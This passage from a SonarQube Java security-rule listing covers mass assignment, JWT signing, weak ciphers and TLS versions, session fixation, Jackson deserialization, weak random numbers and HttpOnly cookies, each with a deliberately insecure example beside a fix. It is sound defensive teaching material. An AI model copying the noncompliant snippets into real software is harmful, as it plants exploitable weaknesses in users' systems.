<p>Don’t set any sensitive properties. Keep full control over which properties are set. If the property names are provided by an unstrusted source,
filter them with a whitelist.</p>
<h2>Sensitive Code Example</h2>
<pre>
Company bean = new Company();
HashMap map = new HashMap();
Enumeration names = request.getParameterNames();
while (names.hasMoreElements()) {
    String name = (String) names.nextElement();
    map.put(name, request.getParameterValues(name));
}
BeanUtils.populate(bean, map); // Sensitive: "map" is populated with data coming from user input, here "request.getParameterNames()"
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/">Top 10 2021 Category A8 - Software and Data Integrity
  Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/915">CWE-915 - Improperly Controlled Modification of Dynamically-Determined Object
  Attributes</a> </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/hDdGBQ">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#BEAN_PROPERTY_INJECTION">BEAN_PROPERTY_INJECTION</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5659">
              java:S5659
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows forging of JSON Web Tokens to impersonate other users.</p>
<h2>Why is this an issue?</h2>
<p>JSON Web Tokens (JWTs), a popular method of securely transmitting information between parties as a JSON object, can become a significant security
risk when they are not properly signed with a robust cipher algorithm, left unsigned altogether, or if the signature is not verified. This
vulnerability class allows malicious actors to craft fraudulent tokens, effectively impersonating user identities. In essence, the integrity of a JWT
hinges on the strength and presence of its signature.</p>
<h3>What is the potential impact?</h3>
<p>When a JSON Web Token is not appropriately signed with a strong cipher algorithm or if the signature is not verified, it becomes a significant
threat to data security and the privacy of user identities.</p>
<h4>Impersonation of users</h4>
<p>JWTs are commonly used to represent user authorization claims. They contain information about the user’s identity, user roles, and access rights.
When these tokens are not securely signed, it allows an attacker to forge them. In essence, a weak or missing signature gives an attacker the power to
craft a token that could impersonate any user. For instance, they could create a token for an administrator account, gaining access to high-level
permissions and sensitive data.</p>
<h4>Unauthorized data access</h4>
<p>When a JWT is not securely signed, it can be tampered with by an attacker, and the integrity of the data it carries cannot be trusted. An attacker
can manipulate the content of the token and grant themselves permissions they should not have, leading to unauthorized data access.</p>
<h2>How to fix it in Java JWT</h2>
<h3>Code examples</h3>
<p>The following code contains examples of JWT encoding and decoding without a strong cipher algorithm.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="11" data-diff-type="noncompliant">
import io.jsonwebtoken.Jwts;

public void encode() {
    Jwts.builder()
        .setSubject(USER_LOGIN)
        .compact(); // Noncompliant
}
</pre>
<pre data-diff-id="12" data-diff-type="noncompliant">
import io.jsonwebtoken.Jwts;

public void decode() {
    Jwts.parser()
        .setSigningKey(SECRET_KEY)
        .parse(token)
        .getBody(); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="11" data-diff-type="compliant">
import io.jsonwebtoken.Jwts;

public void encode() {
    Jwts.builder()
        .setSubject(USER_LOGIN)
        .signWith(SignatureAlgorithm.HS256, SECRET_KEY)
        .compact();
}
</pre>
<p>When using <code>Jwts.parser()</code>, make sure to call <code>parseClaimsJws</code> instead of <code>parse</code> as it throws exceptions for
invalid or missing signatures.</p>
<pre data-diff-id="12" data-diff-type="compliant">
import io.jsonwebtoken.Jwts;

public void decode() {
    Jwts.parser()
        .setSigningKey(SECRET_KEY)
        .parseClaimsJws(token)
        .getBody();
}
</pre>
<h3>How does this work?</h3>
<h4>Always sign your tokens</h4>
<p>The foremost measure to enhance JWT security is to ensure that every JWT you issue is signed. Unsigned tokens are like open books that anyone can
tamper with. Signing your JWTs ensures that any alterations to the tokens after they have been issued can be detected. Most JWT libraries support a
signing function, and using it is usually as simple as providing a secret key when the token is created.</p>
<h4>Choose a strong cipher algorithm</h4>
<p>It is not enough to merely sign your tokens. You need to sign them with a strong cipher algorithm. Algorithms like HS256 (HMAC using SHA-256) are
considered secure for most purposes. But for an additional layer of security, you could use an algorithm like RS256 (RSA Signature with SHA-256),
which uses a private key for signing and a public key for verification. This way, even if someone gains access to the public key, they will not be
able to forge tokens.</p>
<h4>Verify the signature of your tokens</h4>
<p>Resolving a vulnerability concerning the validation of JWT token signatures is mainly about incorporating a critical step into your process:
validating the signature every time a token is decoded. Just having a signed token using a secure algorithm is not enough. If you are not validating
signatures, they are not serving their purpose.</p>
<p>Every time your application receives a JWT, it needs to decode the token to extract the information contained within. It is during this decoding
process that the signature of the JWT should also be checked.</p>
<p>To resolve the issue, follow these instructions:</p>
<ol>
  <li> Use framework-specific functions for signature verification: Most programming frameworks that support JWTs provide specific functions to not
  only decode a token but also validate its signature simultaneously. Make sure to use these functions when handling incoming tokens. </li>
  <li> Handle invalid signatures appropriately: If a JWT’s signature does not validate correctly, it means the token is not trustworthy, indicating
  potential tampering. The action to take when encountering an invalid token should be denying the request carrying it and logging the event for
  further investigation. </li>
  <li> Incorporate signature validation in your tests: When you are writing tests for your application, include tests that check the signature
  validation functionality. This can help you catch any instances where signature verification might be unintentionally skipped or bypassed. </li>
</ol>
<p>By following these practices, you can ensure the security of your application’s JWT handling process, making it resistant to attacks that rely on
tampering with tokens. Validation of the signature needs to be an integral and non-negotiable part of your token handling process.</p>
<h3>Going the extra mile</h3>
<h4>Securely store your secret keys</h4>
<p>Ensure that your secret keys are stored securely. They should not be hard-coded into your application code or checked into your version control
system. Instead, consider using environment variables, secure key management systems, or vault services.</p>
<h4>Rotate your secret keys</h4>
<p>Even with the strongest cipher algorithms, there is a risk that your secret keys may be compromised. Therefore, it is a good practice to
periodically rotate your secret keys. By doing so, you limit the amount of time that an attacker can misuse a stolen key. When you rotate keys, be
sure to allow a grace period where tokens signed with the old key are still accepted to prevent service disruptions.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/347">CWE-347 - Improper Verification of Cryptographic Signature</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5547">
              java:S5547
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for
several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in Java Cryptography Extension</h2>
<h3>Code examples</h3>
<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import javax.crypto.Cipher;
import java.security.NoSuchAlgorithmException;
import javax.crypto.NoSuchPaddingException;

public static void main(String[] args) {
    try {
        Cipher des = Cipher.getInstance("DES"); // Noncompliant
    } catch(NoSuchAlgorithmException|NoSuchPaddingException e) {
        // ...
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import javax.crypto.Cipher;
import java.security.NoSuchAlgorithmException;
import javax.crypto.NoSuchPaddingException;

public static void main(String[] args) {
    try {
        Cipher aes = Cipher.getInstance("AES/GCM/NoPadding");
    } catch(NoSuchAlgorithmException|NoSuchPaddingException e) {
        // ...
    }
}
</pre>
<h3>How does this work?</h3>
<h4>Use a secure algorithm</h4>
<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an
algorithm is the Advanced Encryption Standard (AES).</p>
<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5876">
              java:S5876
            </a>
          </td>
          <td>
            <details>
              <p>An attacker may trick a user into using a predetermined session identifier. Consequently, this attacker can gain unauthorized access and
impersonate the user’s session. This kind of attack is called session fixation, and protections against it should not be disabled.</p>
<h2>Why is this an issue?</h2>
<p>Session fixation attacks take advantage of the way web applications manage session identifiers. Here’s how a session fixation attack typically
works:</p>
<ul>
  <li> When a user visits a website or logs in, a session is created for them. </li>
  <li> This session is assigned a unique session identifier, stored in a cookie, in local storage, or through URL parameters. </li>
  <li> In a session fixation attack, an attacker tricks a user into using a predetermined session identifier controlled by the attacker. For example,
  the attacker sends the victim an email containing a link with this predetermined session identifier. </li>
  <li> When the victim clicks on the link, the web application does not create a new session identifier but uses this identifier known to the
  attacker. </li>
  <li> At this point, the attacker can hijack and impersonate the victim’s session. </li>
</ul>
<h3>What is the potential impact?</h3>
<p>Session fixation attacks pose a significant security risk to web applications and their users. By exploiting this vulnerability, attackers can gain
unauthorized access to user sessions, potentially leading to various malicious activities. Some of the most relevant scenarios are the following:</p>
<h4>Impersonation</h4>
<p>Once an attacker successfully fixes a session identifier, they can impersonate the victim and gain access to their account without providing valid
credentials. This can result in unauthorized actions, such as modifying personal information, making unauthorized transactions, or even performing
malicious activities on behalf of the victim. An attacker can also manipulate the victim into performing actions they wouldn’t normally do, such as
revealing sensitive information or conducting financial transactions on the attacker’s behalf.</p>
<h4>Data Breach</h4>
<p>If an attacker gains access to a user’s session, they may also gain access to sensitive data associated with that session. This can include
personal information, financial details, or any other confidential data that the user has access to within the application. The compromised data can
be used for identity theft, financial fraud, or other malicious purposes.</p>
<h4>Privilege Escalation</h4>
<p>In some cases, session fixation attacks can be used to escalate privileges within a web application. By fixing a session identifier with higher
privileges, an attacker can bypass access controls and gain administrative or privileged access to the application. This can lead to unauthorized
modifications, data manipulation, or even complete compromise of the application and its underlying systems.</p>
<h2>How to fix it in Spring</h2>
<h3>Code examples</h3>
<p>In a Spring Security’s context, session fixation protection is enabled by default but can be disabled with <code>sessionFixation().none()</code>
method. Session fixation protection can also be enabled explicitly with <code>migrateSession()</code> but is superfluous in most cases.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
@Override
protected void configure(HttpSecurity http) throws Exception {
   http.sessionManagement()
     .sessionFixation().none(); // Noncompliant: the existing session will continue
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
@Override
protected void configure(HttpSecurity http) throws Exception {
  http.sessionManagement()
     .sessionFixation().migrateSession();
}
</pre>
<h3>How does this work?</h3>
<p>The protection works by ensuring that the session identifier, which is used to identify and track a user’s session, is changed or regenerated
during the authentication process.</p>
<p>Here’s how session fixation protection typically works:</p>
<ol>
  <li> When a user visits a website or logs in, a session is created for them. This session is assigned a unique session identifier, which is stored
  in a cookie or passed through URL parameters. </li>
  <li> In a session fixation attack, an attacker tricks a user into using a predetermined session identifier controlled by the attacker. This allows
  the attacker to potentially gain unauthorized access to the user’s session. </li>
  <li> To protect against session fixation attacks, session fixation protection mechanisms come into play during the authentication process. When a
  user successfully authenticates, this mechanism generates a new session identifier for the user’s session. </li>
  <li> The old session identifier, which may have been manipulated by the attacker, is invalidated and no longer associated with the user’s session.
  This ensures that any attempts by the attacker to use the fixed session identifier are rendered ineffective. </li>
  <li> The user is then assigned the new session identifier, which is used for subsequent requests and session tracking. This new session identifier
  is typically stored in a new session cookie or passed through URL parameters. </li>
</ol>
<p>By regenerating the session identifier upon authentication, session fixation protection helps ensure that the user’s session is tied to a new,
secure identifier that the attacker cannot predict or control. This mitigates the risk of an attacker gaining unauthorized access to the user’s
session and helps maintain the integrity and security of the application’s session management process.</p>
<p>In Spring, calling <code>migrateSession()</code> explicitly is not necessary in most cases, as it automatically migrates session attributes to a
new session upon successful authentication. The <code>migrateSession()</code> method is typically explicitly used when you want to manually trigger
the migration of session attributes to a new session outside of the authentication process.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<p><a href="https://docs.spring.io/spring-security/reference/servlet/authentication/session-management.html">Session Fixation Attack
Protection</a></p>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">Top 10 2017 Category A2 - Broken Authentication</a>
  </li>
  <li> <a href="https://owasp.org/www-community/attacks/Session_fixation">OWASP Sesssion Fixation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/384">CWE-384 - Session Fixation</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S4423">
              java:S4423
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are
all considered weak by the cryptographic community, and are officially deprecated:</p>
<ul>
  <li> SSL versions 1.0, 2.0 and 3.0 </li>
  <li> TLS versions 1.0 and 1.1 </li>
</ul>
<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform
mathematical attacks on this data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in Java Cryptography Extension</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import javax.net.ssl.SSLContext;
import java.security.NoSuchAlgorithmException;

public static void main(String[] args) {
    try {
        SSLContext.getInstance("TLSv1.1"); // Noncompliant
    } catch (NoSuchAlgorithmException e) {
        // ...
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import javax.net.ssl.SSLContext;
import java.security.NoSuchAlgorithmException;

public static void main(String[] args) {
    try {
        SSLContext.getInstance("TLSv1.2");
    } catch (NoSuchAlgorithmException e) {
        // ...
    }
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic
community.</p>
<p>The best choices at the moment are the following.</p>
<h4>Use TLS v1.2 or TLS v1.3</h4>
<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br></p>
<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not
yet have TLS v1.3 support.</p>
<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are
deprecated as insecure.</p>
<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS
versions, and improves performance.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Wikipedia, Padding Oracle Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack">Wikipedia, Chosen-Ciphertext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack">Wikipedia, Chosen-Plaintext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Semantic_security">Wikipedia, Semantically Secure Cryptosystems</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Wikipedia, OAEP</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">Wikipedia, Galois/Counter Mode</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard - Cryptography Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">Mobile Top 10 2016 Category M5 -
  Insufficient Cryptography</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/hDdGBQ">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S4544">
              java:S4544
            </a>
          </td>
          <td>
            <details>
              <p>Using unsafe Jackson deserialization configuration is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-4995">CVE-2017-4995</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19362">CVE-2018-19362</a> </li>
</ul>
<p>When Jackson is configured to allow Polymorphic Type Handling (aka PTH), formerly known as Polymorphic Deserialization, "deserialization gadgets"
may allow an attacker to perform remote code execution.</p>
<p>This rule raises an issue when:</p>
<ul>
  <li> <code>enableDefaultTyping()</code> is called on an instance of <code>com.fasterxml.jackson.databind.ObjectMapper</code> or
  <code>org.codehaus.jackson.map.ObjectMapper</code>. </li>
  <li> or when the annotation <code>@JsonTypeInfo</code> is set at class, interface or field levels and configured with <code>use =
  JsonTypeInfo.Id.CLASS</code> or <code>use = Id.MINIMAL_CLASS</code>. </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> You configured the Jackson deserializer as mentioned above. </li>
  <li> The serialized data might come from an untrusted source. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use the latest patch versions of <code>jackson-databind</code> blocking the already discovered "deserialization gadgets". </li>
  <li> Avoid using the default typing configuration: <code>ObjectMapper.enableDefaultTyping()</code>. </li>
  <li> If possible, use <code>@JsonTypeInfo(use = Id.NAME)</code> instead of <code>@JsonTypeInfo(use = Id.CLASS)</code> or <code>@JsonTypeInfo(use =
  Id. MINIMAL_CLASS)</code> and so rely on <code>@JsonTypeName</code> and <code>@JsonSubTypes</code>. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping(); // Sensitive
</pre>
<pre>
@JsonTypeInfo(use = Id.CLASS) // Sensitive
abstract class PhoneNumber {
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/">Top 10 2021 Category A8 - Software and Data Integrity
  Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization">Top 10 2017 Category A8 - Insecure
  Deserialization</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data">Deserialization of untrusted data</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/502">CWE-502 - Deserialization of Untrusted Data</a> </li>
  <li> <a href="https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062">On Jackson CVEs: Don’t
  Panic</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-15095">CVE-2017-1509</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-7525">CVE-2017-7525</a> </li>
  <li> Derived from FindSecBugs rule <a
  href="https://find-sec-bugs.github.io/bugs.htm#JACKSON_UNSAFE_DESERIALIZATION">JACKSON_UNSAFE_DESERIALIZATION</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S2245">
              java:S2245
            </a>
          </td>
          <td>
            <details>
              <p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6386">CVE-2013-6386</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3419">CVE-2006-3419</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4102">CVE-2008-4102</a> </li>
</ul>
<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that
will be generated, and use this guess to impersonate another user or access sensitive information.</p>
<p>As the <code>java.util.Random</code> class relies on a pseudorandom number generator, this class and relating <code>java.lang.Math.random()</code>
method should not be used for security-critical applications or for protecting sensitive data. In such context, the
<code>java.security.SecureRandom</code> class which relies on a cryptographically strong random number generator (RNG) should be used in place.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such
  as a password, is hashed. </li>
  <li> the function you use generates a value which can be predicted (pseudo-random). </li>
  <li> the generated value is used multiple times. </li>
  <li> an attacker can access the generated value. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use a cryptographically strong random number generator (RNG) like "java.security.SecureRandom" in place of this PRNG. </li>
  <li> Use the generated random values only once. </li>
  <li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
Random random = new Random(); // Sensitive use of Random
byte bytes[] = new byte[20];
random.nextBytes(bytes); // Check if bytes is used for hashing, encryption, etc...
</pre>
<h2>Compliant Solution</h2>
<pre>
SecureRandom random = new SecureRandom(); // Compliant for security-sensitive use cases
byte bytes[] = new byte[20];
random.nextBytes(bytes);
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard - Cryptography Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">Mobile Top 10 2016 Category M5 -
  Insufficient Cryptography</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/338">CWE-338 - Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/330">CWE-330 - Use of Insufficiently Random Values</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/326">CWE-326 - Inadequate Encryption Strength</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1241">CWE-1241 - Use of Predictable Algorithm in Random Number Generator</a> </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/oTdGBQ">CERT, MSC02-J.</a> - Generate strong random numbers </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/UNcxBQ">CERT, MSC30-C.</a> - Do not use the rand() function for generating pseudorandom numbers
  </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/2ns-BQ">CERT, MSC50-CPP.</a> - Do not use std::rand() for generating pseudorandom numbers </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM">Predictable Pseudo Random Number
  Generator</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S3330">
              java:S3330
            </a>
          </td>
          <td>
            <details>
              <p>When a cookie is configured with the <code>HttpOnly</code> attribute set to <em>true</em>, the browser guaranties that no client-side script will
be able to read it. In most cases, when a cookie is created, the default value of <code>HttpOnly</code> is <em>false</em> and it’s up to the developer
to decide whether or not the content of the cookie can be read by the client-side script. As a majority of Cross-Site Scripting (XSS) attacks target
the theft of session-cookies, the <code>HttpOnly</code> attribute can help to reduce their impact as it won’t be possible to exploit the XSS
vulnerability to steal session-cookies.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the cookie is sensitive, used to authenticate the user, for instance a <em>session-cookie</em> </li>
  <li> the <code>HttpOnly</code> attribute offer an additional protection (not the case for an <em>XSRF-TOKEN cookie</em> / CSRF token for example)
  </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> By default the <code>HttpOnly</code> flag should be set to <em>true</em> for most of the cookies and it’s mandatory for session /
  sensitive-security cookies. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>If you create a security-sensitive cookie in your JAVA code:</p>
<pre>
Cookie c = new Cookie(COOKIENAME, sensitivedata);
c.setHttpOnly(false);  // Sensitive: this sensitive cookie is created with the httponly flag set to false and so it can be stolen easily in case of XSS vulnerability
</pre>
